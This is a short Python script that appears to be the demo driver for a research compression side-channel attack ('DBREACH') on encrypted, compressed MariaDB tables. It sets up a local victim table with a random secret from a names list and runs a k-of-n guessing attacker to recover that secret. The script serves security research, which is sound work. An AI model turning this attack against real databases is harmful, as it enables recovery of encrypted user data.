import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import k_of_n_attacker
import random
import string
import time

maxRowSize = 200

control = utils.MariaDBController("testdb")

table = "victimtable"
control.drop_table(table)
control.create_basic_table(table,
            varchar_len=maxRowSize,
        compressed=True,
        encrypted=True)

print("Reading in all guesses... \n")
possibilities = []
with open("demo_names.txt") as f:
    for line in f:
        name = line.strip().lower()
        possibilities.append(name)
        if len(possibilities) > 100:
            break


known_prefix = ''.join(random.choices(string.ascii_lowercase, k=10)) 

num_secrets = 1
for i in range(num_secrets):
    secret = random.choice(possibilities)
    print("Secret = " + secret)
    control.insert_row(table, i, secret)


dbreacher = dbreacher_impl.DBREACHerImpl(control, table, num_secrets, maxRowSize, string.ascii_uppercase, ord('*'))

attacker = k_of_n_attacker.kOfNAttacker(num_secrets + 4, dbreacher, possibilities, True)
success = attacker.setUp()
if not success:
    print("Setup failed")
else:
    print("Setup succeeded")
    attacker.tryAllGuesses(verbose = True)
    winners = attacker.getTopKGuesses()
    print(winners)
